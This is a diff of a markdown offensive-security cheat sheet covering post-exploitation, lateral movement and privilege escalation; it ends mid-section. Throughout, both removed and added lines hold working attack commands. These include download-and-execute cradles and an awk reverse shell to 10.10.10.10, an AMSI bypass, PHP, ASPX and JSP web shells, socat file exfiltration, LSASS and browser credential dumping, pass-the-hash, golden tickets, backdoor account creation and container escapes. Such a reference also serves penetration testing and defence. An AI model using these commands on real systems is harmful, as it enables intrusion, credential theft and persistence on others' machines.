-# Add immediate scheduled task
-SharpGPOAbuse.exe --AddImmediateTask --TaskName "Update" --Command "cmd.exe" --Arguments "/c malware.exe" --GPOName "TestGPO"
+## 6. Post-Exploitation
 
-# Modify user rights
-SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege,SeTcbPrivilege" --UserAccount "DOMAIN\user" --GPOName "TestGPO"
-
-# Add startup script
-SharpGPOAbuse.exe --AddStartupScript --ScriptName "startup.bat" --ScriptContent "net user backdoor Password123! /add" --GPOName "TestGPO"
-
-6.POST-EXPLOITATION
-
-6.1 Initial Access & Shells
-
-PowerShell Payloads and Execution
-powershell
-# Download and execute in memory
+### Initial Access & Shells
+```bash
+# PowerShell execution
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
-IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1')
+# Use: Memory execution - runs scripts without disk writing
 
-# Memory execution of assembly
-$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.10.10/shellcode.bin')
-[Reflection.Assembly]::Load($bytes)
-
-# AMSI bypass techniques
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
-# Constrained language mode bypass
-iex (irm http://10.10.10.10/amsibypass.txt)
-
-# PowerShell without powershell.exe
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"
+# Use: Bypass execution - bypasses execution policies
 
-# Encoded command execution
-$command = "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-$encodedCommand = [Convert]::ToBase64String($bytes)
+$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"))
 powershell -EncodedCommand $encodedCommand
+# Use: Encoded execution - obfuscates command
 
-# PowerShell profile persistence
-echo "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/persistence.ps1')" >> $PROFILE
-Web Shells for Various Platforms
+# Web shells
+# PHP: <?php system($_GET['cmd']); ?>
+# Use: PHP backdoor - command execution through web
 
-php
-<?php 
-// Basic PHP web shell
-system($_GET['cmd']); 
-echo shell_exec($_GET['cmd']); 
-eval($_POST['cmd']); 
-?>
+# ASPX: <%@ Page Language="C#" %> <script runat="server"> void Page_Load(object sender, EventArgs e) { System.Diagnostics.Process.Start(Request["cmd"]); } </script>
+# Use: ASP.NET shell - command execution in ASP.NET
 
-<?php
-// Advanced PHP web shell with authentication
-if ($_POST['pass'] == 'password') {
-    system($_POST['cmd']);
-}
-?>
+# JSP: <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
+# Use: JSP shell - command execution in Java
+```
 
-<?php
-// PHP file upload web shell
-if (isset($_FILES['file'])) {
-    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
-    system($_FILES['file']['name']);
-}
-?>
-aspx
-<%-- ASP.NET web shell --%>
-<%@ Page Language="C#" %>
-<script runat="server">
-void Page_Load(object sender, EventArgs e) {
-    System.Diagnostics.Process.Start(Request["cmd"]);
-}
-</script>
+### Living Off the Land (LOLBins)
+```bash
+# Windows LOLBins
+certutil -urlcache -split -f http://10.10.10.10/payload.exe
+# Use: File download - uses certutil for downloading
 
-<%-- Advanced ASP.NET shell --%>
-<%@ Page Language="C#" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<script runat="server">
-void cmdExe_Click(object sender, EventArgs e) {
-    Process p = new Process();
-    p.StartInfo.FileName = "cmd.exe";
-    p.StartInfo.Arguments = "/c " + txtCommand.Text;
-    p.StartInfo.UseShellExecute = false;
-    p.StartInfo.RedirectStandardOutput = true;
-    p.Start();
-    lblOutput.Text = p.StandardOutput.ReadToEnd();
-}
-</script>
-jsp
-<%-- JSP web shell --%>
-<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
+bitsadmin /transfer job /download /priority normal http://10.10.10.10/payload.exe
+# Use: BITS transfer - background file download
 
-<%@ page import="java.util.*,java.io.*"%>
-<%
-if (request.getParameter("cmd") != null) {
-    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
-    OutputStream os = p.getOutputStream();
-    InputStream in = p.getInputStream();
-    DataInputStream dis = new DataInputStream(in);
-    String disr = dis.readLine();
-    while ( disr != null ) {
-        out.println(disr); 
-        disr = dis.readLine(); 
-    }
-}
-%>
-
-6.2 Living Off the Land (LOLBins)
-
-Windows LOLBins (Living Off the Land Binaries)
-cmd
-# CertUtil for download and encoding
-certutil -urlcache -split -f http://10.10.10.10/payload.exe C:\Windows\Temp\payload.exe
-certutil -encode payload.exe payload.b64
-certutil -decode payload.b64 payload.exe
-
-# BitsAdmin for download
-bitsadmin /transfer job /download /priority normal http://10.10.10.10/payload.exe C:\Windows\Temp\payload.exe
-
-# MSBuild for code execution
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
-
-# InstallUtil for execution
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
-
-# Regsvr32 for scriptlet execution
 regsvr32 /s /n /u /i:http://10.10.10.10/payload.sct scrobj.dll
+# Use: Scriptlet execution - runs scripts through regsvr32
 
-# Rundll32 for DLL execution
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd.exe");
-
-# Msiexec for remote package installation
-msiexec /q /i http://10.10.10.10/package.msi
-
-# Mshta for HTA execution
 mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe"":close")
+# Use: HTA execution - runs commands through mshta
 
-# Control for DLL loading
-control.exe C:\Windows\Temp\payload.dll
-
-# Forfiles for command execution
-forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c whoami"
-
-# PCALauncher for script execution
-Microsoft.Workflow.Compiler.exe payload.xml payload.xml
-
-Linux LOLBins
-bash
-# Curl download and execution
+# Linux LOLBins
 curl http://10.10.10.10/payload.sh | bash
-curl -s http://10.10.10.10/payload.py | python3
+# Use: Pipe execution - downloads and executes directly
 
-# Wget download
-wget http://10.10.10.10/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh
-
-# Python one-liner download and execution
 python -c "import urllib2; exec(urllib2.urlopen('http://10.10.10.10/payload.py').read())"
+# Use: Python execution - downloads and runs Python code
 
-# Perl download and execution
-perl -e 'use LWP::Simple; getstore("http://10.10.10.10/payload.pl", "/tmp/payload.pl")'
-perl /tmp/payload.pl
-
-# AWK network communication
 awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+# Use: AWK networking - creates reverse shell with awk
+```
 
-# SSH for reverse shells
-ssh -R 4444:localhost:22 user@10.10.10.10
-
-# Socat for file transfers and shells
-socat TCP:10.10.10.10:4444 EXEC:/bin/bash
-socat FILE:secret.txt TCP:10.10.10.10:4444
-
-# Git for data exfiltration
-git clone http://10.10.10.10/repo.git
-git add secret.txt
-git commit -m "update"
-git push
-
-6.3 Credential Dumping
-
-Windows Credential Dumping Tools
-bash
-# LaZagne for multiple credential types
+### Credential Dumping
+```bash
+# LaZagne
 python2 laZagne.py all
+# Use: Multi-platform - extracts various credential types
+
 python2 laZagne.py browsers
-python2 laZagne.py wifi
-python2 laZagne.py git
+# Use: Browser focus - extracts browser passwords
 
 # Windows Credential Editor
 wce.exe -w
-wce.exe -l
+# Use: Windows credentials - extracts hashes and passwords
 
-# KeePass credential extraction
+# KeePass extraction
 KeeThief.exe
-KeePassX.exe --export C:\backup.kdbx
-LSASS Memory Dumping
+# Use: KeePass attack - extracts KeePass master passwords
 
-bash
-# Procdump for LSASS dumping
+# LSASS dumping
 procdump.exe -ma lsass.exe lsass.dmp
+# Use: Memory dumping - creates LSASS memory dump
 
-# Task Manager method
-# Open Task Manager -> Details -> Right-click lsass.exe -> Create dump file
-
-# Comsvcs.dll method
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\lsass.dmp full
+# Use: Comsvcs dumping - uses built-in DLL for dumping
+```
 
-# PowerShell dumping
-Get-Process lsass | Out-MiniDump -DumpFilePath C:\lsass.dmp
-6.4 Memory Analysis
-Volatility Framework - Memory Forensics
-
-bash
-# Memory image information
+### Memory Analysis
+```bash
+# Volatility
 volatility -f memory.dump imageinfo
+# Use: Image identification - identifies memory image profile
 
-# Process listing
 volatility -f memory.dump --profile=Win10x64_18362 pslist
-volatility -f memory.dump --profile=Win10x64_18362 psscan
-volatility -f memory.dump --profile=Win10x64_18362 pstree
+# Use: Process listing - shows running processes
 
-# Network connections
 volatility -f memory.dump --profile=Win10x64_18362 netscan
-volatility -f memory.dump --profile=Win10x64_18362 netstat
+# Use: Network connections - shows network activity
 
-# Credential extraction
 volatility -f memory.dump --profile=Win10x64_18362 mimikatz
-volatility -f memory.dump --profile=Win10x64_18362 hashdump
+# Use: Credential extraction - extracts passwords from memory
 
-# DLL analysis
-volatility -f memory.dump --profile=Win10x64_18362 dlllist
-volatility -f memory.dump --profile=Win10x64_18362 ldrmodules
-
-# Malware detection
 volatility -f memory.dump --profile=Win10x64_18362 yarascan --yara-file=rules.yar
-volatility -f memory.dump --profile=Win10x64_18362 malfind
+# Use: Malware detection - scans for malicious patterns
+```
 
-# Registry analysis
-volatility -f memory.dump --profile=Win10x64_18362 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
+---
 
+## 7. Lateral Movement
 
-7.LATERAL MOVEMENT
-
-7.1 Pass-the-Hash & Token Attacks
-
-Pass-the-Hash Techniques
-bash
-# CrackMapExec PTH attacks
+### Pass-the-Hash & Token Attacks
+```bash
+# CrackMapExec PTH
 crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH -x whoami
-# Use Case: Lateral movement with compromised hashes
-# Explanation: Uses NTLM hashes for authentication without knowing passwords
+# Use: Hash-based execution - runs commands using hashes
 
-# Impacket PTH attacks
+# Impacket PTH
 python3 psexec.py -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: Remote code execution using pass-the-hash
-# Explanation: Provides SYSTEM-level access using hash authentication
+# Use: Remote execution - SMB execution with hashes
 
-# RDP with Pass-the-Hash
-xfreerdp /v:10.10.10.5 /u:administrator /pth:NTLM_HASH +compression /clipboard
-# Use Case: GUI access with hash authentication
-# Explanation: Connects to Remote Desktop using NTLM hash
+# RDP with PTH
+xfreerdp /v:10.10.10.5 /u:administrator /pth:NTLM_HASH
+# Use: GUI access - RDP connection using hash
 
-# WMI with Pass-the-Hash
-python3 wmiexec.py -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: Lateral movement via WMI
-# Explanation: Executes commands through Windows Management Instrumentation
-
-# Multiple hash formats
-# NTLM: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
-# LM: e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
-
-Token Manipulation
-powershell
-# Incognito token operations
+# Token manipulation
 Incognito.exe list_tokens -u
-# Use Case: Listing available tokens
-# Explanation: Shows all available tokens for impersonation
+# Use: Token enumeration - lists available tokens
 
-# Token impersonation
 Incognito.exe execute -c "DOMAIN\USER" C:\Windows\System32\cmd.exe
-# Use Case: Running commands as another user
-# Explanation: Impersonates a user token to execute commands
+# Use: Token impersonation - runs commands as other user
 
-# Meterpreter token commands
 meterpreter > use incognito
 meterpreter > list_tokens -u
 meterpreter > impersonate_token "DOMAIN\\USER"
-meterpreter > rev2self
-# Use Case: Token manipulation through Meterpreter
-# Explanation: Lists, impersonates, and reverts tokens
+# Use: Meterpreter tokens - token manipulation through Meterpreter
+```
 
-# PowerShell token operations
-[System.Security.Principal.WindowsIdentity]::GetCurrent()
-# Use Case: Current token information
-# Explanation: Gets information about current security token
-
-Kerberos Ticket Attacks
-bash
-# Pass-the-Ticket with Rubeus
-Rubeus.exe ptt /ticket:base64_ticket
-# Use Case: Using stolen Kerberos tickets
-# Explanation: Injects Kerberos tickets into current session
-
-# Ticket export and import
-Rubeus.exe dump /nowrap
-Rubeus.exe ptt /ticket:doIE5jCCB...
-# Use Case: Ticket harvesting and reuse
-# Explanation: Exports tickets from memory and imports them
-
-# Golden Ticket usage
-Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-... /user:administrator /id:500 /ptt
-# Use Case: Domain persistence with forged tickets
-# Explanation: Creates and uses golden tickets for domain access
-
-7.2 WMI & Remote Management
-
-WMI Execution Methods
-bash
-# Impacket WMI execution
+### WMI & Remote Management
+```bash
+# Impacket WMI
 python3 wmiexec.py -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: Remote command execution via WMI
-# Explanation: Uses Windows Management Instrumentation for execution
+# Use: WMI execution - command execution through WMI
 
-# PowerShell WMI commands
-Get-WmiObject -Class Win32_Process -ComputerName 10.10.10.5 -Credential $cred | Invoke-WmiMethod -Name Create -ArgumentList "cmd.exe /c whoami"
-# Use Case: WMI operations through PowerShell
-# Explanation: Creates processes remotely using WMI
+# PowerShell WMI
+Get-WmiObject -Class Win32_Process -ComputerName 10.10.10.5 | Invoke-WmiMethod -Name Create -ArgumentList "cmd.exe /c whoami"
+# Use: Remote process creation - creates processes via WMI
 
-# WMIC built-in tool
+# WMIC
 wmic /node:10.10.10.5 /user:DOMAIN\user /password:pass process call create "cmd.exe /c whoami"
-# Use Case: Built-in WMI command-line tool
-# Explanation: Uses Windows Management Instrumentation Console
+# Use: Built-in WMI - command execution through WMIC
 
-# WMI class enumeration
-wmic /node:10.10.10.5 /user:DOMAIN\user /password:pass path Win32_LogicalDisk Get Name,Size,FreeSpace
-# Use Case: Remote system information gathering
-# Explanation: Queries WMI classes for system information
-
-# WMI event subscription for persistence
-wmic /node:10.10.10.5 /user:DOMAIN\user /password:pass path __EventFilter Create Name="BotFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-# Use Case: WMI-based persistence
-# Explanation: Creates event filters for triggered execution
-
-WinRM Access Methods
-bash
-# Evil-WinRM for remote management
+# WinRM
 evil-winrm -i 10.10.10.5 -u administrator -p password
-# Use Case: PowerShell remoting via WinRM
-# Explanation: Provides interactive PowerShell session through WinRM
+# Use: PowerShell remoting - interactive PowerShell session
 
-# PowerShell WinRM sessions
 Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred
-# Use Case: Native PowerShell remoting
-# Explanation: Establishes PowerShell session to remote host
+# Use: Native PowerShell - built-in PowerShell remoting
+```
 
-# WinRS built-in tool
-winrs -r:10.10.10.5 -u:administrator -p:password whoami
-# Use Case: Remote command execution via WinRS
-# Explanation: Uses Windows Remote Services for command execution
-
-# WinRM with SSL
-evil-winrm -i 10.10.10.5 -u administrator -p password -S
-# Use Case: Secure WinRM connections
-# Explanation: Connects using SSL-encrypted WinRM
-
-# WinRM session configuration
-Get-PSSessionConfiguration
-Enable-PSRemoting -Force
-# Use Case: WinRM service configuration
-# Explanation: Enables and configures PowerShell remoting
-
-7.3 PSExec & Service Attacks
-
-PSExec-Style Execution
-bash
+### PSExec & Service Attacks
+```bash
 # Impacket PSExec
 python3 psexec.py -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: Remote service-based execution
-# Explanation: Creates a service to execute commands remotely
+# Use: Service execution - creates service for command execution
 
-# CrackMapExec service execution
-crackmapexec smb 10.10.10.5 -u user -p password -x "whoami" --exec-method smbexec
-# Use Case: Multiple execution method options
-# Explanation: Uses SMB execution for command running
-
-# SC command for service management
+# SC command
 sc \\10.10.10.5 create Update binpath= "cmd.exe /c whoami"
 sc \\10.10.10.5 start Update
-sc \\10.10.10.5 delete Update
-# Use Case: Windows service creation and management
-# Explanation: Creates, starts, and deletes services remotely
+# Use: Service creation - creates and starts Windows services
 
-# Atexec for task scheduling
-python3 atexec.py -hashes LMHASH:NTHASH domain/user@target_ip "whoami"
-# Use Case: Task scheduler-based execution
-# Explanation: Uses Windows Task Scheduler for remote execution
-
-Service Control Manager Attacks
-powershell
-# PowerShell service management
+# PowerShell services
 New-Service -Name "UpdateService" -BinaryPathName "C:\Windows\System32\malware.exe" -StartupType Automatic
-Start-Service -Name "UpdateService"
-# Use Case: Service-based persistence and execution
-# Explanation: Creates and starts Windows services
+# Use: Service persistence - creates persistent service
 
-# Remote service creation
-Invoke-Command -ComputerName 10.10.10.5 -ScriptBlock { New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\System32\cmd.exe /c whoami" }
-# Use Case: Remote service deployment
-# Explanation: Creates services on remote systems
-
-# Service DLL hijacking
+# Service modification
 sc config VulnerableService binPath= "C:\Windows\System32\malicious.dll"
-# Use Case: Service binary replacement
-# Explanation: Changes service binary path to malicious DLL
+# Use: Service hijacking - replaces service binary
+```
 
-7.4 DCOM & COM Object Attacks
-
-DCOM Lateral Movement
-powershell
-# MMC20.Application DCOM
+### DCOM & COM Object Attacks
+```bash
+# DCOM execution
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.5"))
 $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
-# Use Case: DCOM-based command execution
-# Explanation: Uses MMC20 Application COM object for execution
+# Use: MMC20 DCOM - command execution through MMC
 
-# ShellWindows DCOM
 $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.5"))
 $com.Item().Document.Application.ShellExecute("cmd.exe","/c whoami","C:\Windows\System32",$null,0)
-# Use Case: Alternative DCOM method
-# Explanation: Uses ShellWindows COM object
+# Use: ShellWindows DCOM - alternative DCOM method
 
-# Excel DCOM
-$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","10.10.10.5"))
-$com.DDEInitiate("cmd","/c whoami")
-# Use Case: Excel DDE execution
-# Explanation: Uses Excel DDE for command execution
-
-# ShellBrowserWindow DCOM
-$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.10.10.5"))
-$com.Document.Application.ShellExecute("cmd.exe","/c whoami","C:\Windows\System32",$null,0)
-# Use Case: ShellBrowser DCOM execution
-Impacket DCOM Execution
-
-bash
-# DCOM execution via Impacket
+# Impacket DCOM
 python3 dcomexec.py -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: DCOM-based lateral movement
-# Explanation: Uses Distributed COM for remote execution
+# Use: DCOM execution - uses DCOM for lateral movement
+```
 
-# Specific DCOM object targeting
-python3 dcomexec.py -object MMC20 -hashes LMHASH:NTHASH domain/user@target_ip
-# Use Case: Targeting specific DCOM objects
-# Explanation: Specifies which DCOM object to use for execution
-
-7.5 RDP & GUI Access Methods
-
-Remote Desktop Attacks
-bash
-# RDP connection with credentials
+### RDP & GUI Access
+```bash
+# RDP connections
 xfreerdp /v:10.10.10.5 /u:administrator /p:password /drive:/home/user,/share
-# Use Case: GUI access to remote systems
-# Explanation: Connects to Remote Desktop with shared drives
+# Use: RDP with shares - connects with shared drives
 
-# RDP with restricted admin mode
 xfreerdp /v:10.10.10.5 /u:administrator /p:password /restricted-admin
-# Use Case: RDP without credentials caching
-# Explanation: Uses Restricted Admin mode to avoid credential exposure
+# Use: Restricted admin - RDP without credential caching
 
-# RDP session hijacking
+# Session hijacking
 tscon 2 /dest:console
-# Use Case: Taking over existing RDP sessions
-# Explanation: Connects to existing sessions without authentication
+# Use: Session takeover - takes over existing RDP sessions
 
-# RDP with clipboard and file sharing
-xfreerdp /v:10.10.10.5 /u:user /p:pass +clipboard /drive:linux:/home/user
-# Use Case: Data transfer through RDP
-# Explanation: Enables clipboard and file sharing
-
-VNC & Alternative Remote Access
-bash
-# VNC connection
+# VNC access
 vncviewer 10.10.10.5:5900
-# Use Case: VNC-based remote access
-# Explanation: Connects to VNC servers
+# Use: VNC connection - connects to VNC servers
+```
 
-# TightVNC with file transfer
-vncviewer -log *:100:100 -config vnc.cfg 10.10.10.5
-# Use Case: Enhanced VNC features
-# Explanation: Uses TightVNC with additional capabilities
+---
 
-# Remote desktop through browser
-rdesktop -r clipboard:PRIMARYCLIPBOARD -g 1024x768 10.10.10.5
-# Use Case: RDP through rdesktop
-# Explanation: Alternative RDP client with clipboard support
+## 8. Privilege Escalation
 
-8.PRIVILEGE ESCALATION
-
-8.1 Windows Privilege Escalation
-
-WinPEAS - Automated Windows Enumeration
-cmd
-# Comprehensive system scanning
+### Windows Privilege Escalation
+```bash
+# WinPEAS
 winpeas.exe quiet fast
-# Use Case: Automated privilege escalation enumeration
-# Explanation: Runs all checks quickly with minimal output
+# Use: Automated enumeration - comprehensive system checks
 
-# Specific check categories
 winpeas.exe services processes applications
-# Use Case: Focused enumeration
-# Explanation: Checks specific system areas for escalation vectors
+# Use: Focused checks - specific system areas
 
-# Domain environment checks
-winpeas.exe domain
-# Use Case: Active Directory privilege escalation
-# Explanation: Focuses on domain-specific escalation paths
-
-# Detailed output with colors
-winpeas.exe
-# Use Case: Interactive enumeration
-# Explanation: Full output with color-coded results
-
-# Custom checks and filters
-winpeas.exe notcolor
-# Use Case: Script-friendly output
-# Explanation: Plain text output for parsing
-
-PowerUp - PowerShell Privilege Escalation
-powershell
-# Import and run all checks
+# PowerUp
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerUp.ps1')
 Invoke-AllChecks
-# Use Case: Comprehensive PowerShell-based enumeration
-# Explanation: Runs all PowerUp checks for escalation vectors
+# Use: PowerShell enumeration - checks for common misconfigurations
 
-# Specific privilege escalation methods
 Invoke-ServiceAbuse -Name "VulnerableService" -Command "net user backdoor Password123! /add"
-# Use Case: Service-based privilege escalation
-# Explanation: Abuses service permissions for privilege gain
+# Use: Service abuse - exploits service permissions
 
-# DLL hijacking identification
-Write-HijackDll -OutputFile "C:\Program Files\VulnerableApp\legit.dll"
-# Use Case: DLL hijacking attacks
-# Explanation: Creates hijackable DLLs for privilege escalation
-
-# Unquoted service path exploitation
-Get-ServiceUnquoted
-Write-ServiceBinary -ServiceName "VulnerableService" -Command "net localgroup administrators user /add"
-# Use Case: Unquoted service path vulnerability
-# Explanation: Exploits services with unquoted paths
-
-# AlwaysInstallElevated checks
-Get-RegistryAlwaysInstallElevated
-Write-UserAddMSI
-# Use Case: MSI installation privilege escalation
-# Explanation: Checks and exploits AlwaysInstallElevated settings
-
-Windows Kernel Exploits
-bash
-# Watson exploit suggester
+# Kernel exploits
 Watson.exe --search
-# Use Case: Identifying applicable kernel exploits
-# Explanation: Suggests kernel exploits based on OS version and patches
+# Use: Exploit suggester - identifies applicable kernel exploits
 
-# Manual exploit compilation and execution
-# Example: CVE-2021-36934 (HiveNightmare)
-icacls C:\Windows\System32\config\sam /grant Everyone:F
-copy C:\Windows\System32\config\sam C:\temp\
-copy C:\Windows\System32\config\system C:\temp\
-copy C:\Windows\System32\config\security C:\temp\
-# Use Case: SAM database extraction through vulnerability
-# Explanation: Exploits HiveNightmare to copy SAM database
-
-# PrintSpoofer for service account escalation
 PrintSpoofer.exe -i -c cmd
-# Use Case: Service account to SYSTEM escalation
-# Explanation: Exploits printer spooler service for privilege escalation
+# Use: Print spooler - exploits printer spooler service
 
-# JuicyPotato for COM abuse
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
-# Use Case: Service account privilege escalation
-# Explanation: Uses COM server abuse for privilege escalation
+# Use: COM abuse - service account privilege escalation
 
-# RoguePotato for updated exploitation
-RoguePotato.exe -r 10.10.10.10 -e "cmd.exe" -l 9999
-# Use Case: Modern Potato variant
-# Explanation: Updated version for newer Windows systems
-
-Access Token Manipulation
-powershell
-# Token privilege enumeration
+# Token privileges
 whoami /priv
-whoami /groups
-# Use Case: Identifying available token privileges
-# Explanation: Shows current token privileges and groups
+# Use: Privilege checking - shows current token privileges
+```
 
-# SeImpersonatePrivilege exploitation
-.\PrintSpoofer.exe -i -c cmd
-.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
-# Use Case: Exploiting impersonation privileges
-# Explanation: Uses token impersonation for privilege escalation
+### Linux Privilege Escalation
+```bash
+# LinPEAS
+./linpeas.sh -a -s
+# Use: Comprehensive enumeration - extensive Linux checks
 
-# SeDebugPrivilege exploitation
-# Use with Mimikatz or process injection
-mimikatz # privilege::debug
-mimikatz # token::elevate
-# Use Case: Debug privilege exploitation
-# Explanation: Uses debug privileges for token elevation
-
-8.2 Linux Privilege Escalation
-
-LinPEAS - Automated Linux Enumeration
-bash
-# Comprehensive system scanning
-./linpeas.sh -a -s -r report.html
-# Use Case: Automated Linux privilege escalation enumeration
-# Explanation: Runs all checks with HTML report output
-
-# Quick assessment mode
 ./linpeas.sh -quick
-# Use Case: Fast initial assessment
-# Explanation: Runs quick checks for common vectors
+# Use: Quick assessment - fast common checks
 
-# Stealth mode operation
-./linpeas.sh -t -p -i
-# Use Case: Stealthy enumeration
-# Explanation: Uses techniques to avoid detection
-
-# Custom checks and filters
-./linpeas.sh -e /tmp/extra_checks.txt
-# Use Case: Extended enumeration
-# Explanation: Adds custom checks to standard enumeration
-
-LinuxExploitSuggester - Kernel Exploit Identification
-bash
-# Kernel exploit suggestions
+# Linux Exploit Suggester
 python3 linux-exploit-suggester.py --kernel 3.13.0
-# Use Case: Identifying applicable kernel exploits
-# Explanation: Suggests exploits based on kernel version
+# Use: Kernel exploits - suggests applicable kernel exploits
 
-# Comprehensive system checking
 ./linux-exploit-suggester.sh --checkall
-# Use Case: Full system exploit assessment
-# Explanation: Checks all possible exploit vectors
+# Use: Full checking - all possible exploit vectors
 
-# Offline kernel analysis
-python3 linux-exploit-suggester.py --kernel 3.13.0 --distro ubuntu --release 14.04
-# Use Case: Offline exploit research
-# Explanation: Suggests exploits without live system access
-
-SUID/SGID Exploitation
-bash
-# Find SUID files
+# SUID/SGID exploitation
 find / -perm -4000 -type f 2>/dev/null
-find / -perm -2000 -type f 2>/dev/null
-# Use Case: Finding privileged executables
-# Explanation: Locates SUID and SGID binaries
+# Use: SUID finding - finds privileged executables
 
-# Common SUID exploitation techniques
-# find privilege escalation
 find . -exec /bin/sh \; -quit
+# Use: SUID abuse - exploits find command SUID
 
-# nano/vim privilege escalation
-nano /etc/passwd
-vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
-
-# bash privilege escalation
-bash -p
-
-# cp/mv privilege escalation
-cp /bin/bash /tmp/bash && chmod +s /tmp/bash
-
-# Common exploitable SUID binaries
-# nmap, vim, find, bash, less, more, nano, cp, mv
-
-Capabilities Exploitation
-bash
-# Find files with capabilities
+# Capabilities
 getcap -r / 2>/dev/null
-# Use Case: Finding capability-based privilege escalation
-# Explanation: Locates files with Linux capabilities
+# Use: Capability finding - finds files with capabilities
 
-# Common capability exploits
-# perl capability escalation
-perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
-
-# python capability escalation
-python -c 'import os; os.setuid(0); os.system("/bin/sh")'
-
-# php capability escalation
-php -r "posix_setuid(0); system('/bin/sh');"
-
-# tar capability escalation
-tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-
-Sudo Privilege Escalation
-bash
-# Check sudo permissions
+# Sudo exploitation
 sudo -l
-# Use Case: Identifying sudo-based escalation vectors
-# Explanation: Shows commands available through sudo
+# Use: Sudo permissions - shows available sudo commands
 
-# Common sudo exploitation techniques
-# sudo vi/vim
 sudo vi -c '!sh'
+# Use: Sudo escape - escapes to shell through sudo
+```
 
-# sudo find
-sudo find / -exec sh -i \;
-
-# sudo awk
-sudo awk 'BEGIN {system("/bin/sh")}'
-
-# sudo less/more
-sudo less /etc/hosts
-!/bin/sh
-
-# sudo man
-sudo man man
-!/bin/sh
-
-# sudo git
-sudo git help status
-!/bin/sh
-
-# Sudo environment variable abuse
-sudo PYTHONPATH=/tmp python script.py
-# Use Case: Environment variable manipulation
-# Explanation: Uses environment variables for privilege escalation
-
-
-Docker & Container Escapes
-bash
-# Check for container
-cat /proc/1/cgroup
-ls -la /.dockerenv
-# Use Case: Container environment detection
-# Explanation: Identifies if running in container
-
-# Docker socket exploitation
-docker run -v /:/host -it alpine chroot /host /bin/sh
-# Use Case: Docker socket privilege escalation
-# Explanation: Uses Docker socket access for host escape
-
-# Privileged container escape
-docker run --privileged -v /:/host -it alpine chroot /host /bin/sh
-# Use Case: Privileged container escape
-# Explanation: Escapes privileged containers to host
-
-# Capabilities-based escape
-docker run --cap-add=ALL -v /:/host -it alpine chroot /host /bin/sh
-# Use Case: Capability-based container escape
-# Explanation: Uses container capabilities for host access
-
-
-8.3 Service Abuse & Misconfigurations
-
-Windows Service Exploitation
-powershell
-# Unquoted service path exploitation
+### Service Abuse & Misconfigurations
+```bash
+# Windows services
 Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -like "* *" -and $_.PathName -notlike '"*"'}
-# Use Case: Finding unquoted service paths
-# Explanation: Identifies services vulnerable to path interception
+# Use: Unquoted paths - finds services with unquoted paths
 
-# Service permission analysis
 accesschk.exe -uwcqv "Authenticated Users" *
-accesschk.exe -uwcqv "Everyone" *
-# Use Case: Service permission enumeration
-# Explanation: Checks service permissions for weak settings
+# Use: Permission checking - checks service permissions
 
-# Service binary replacement
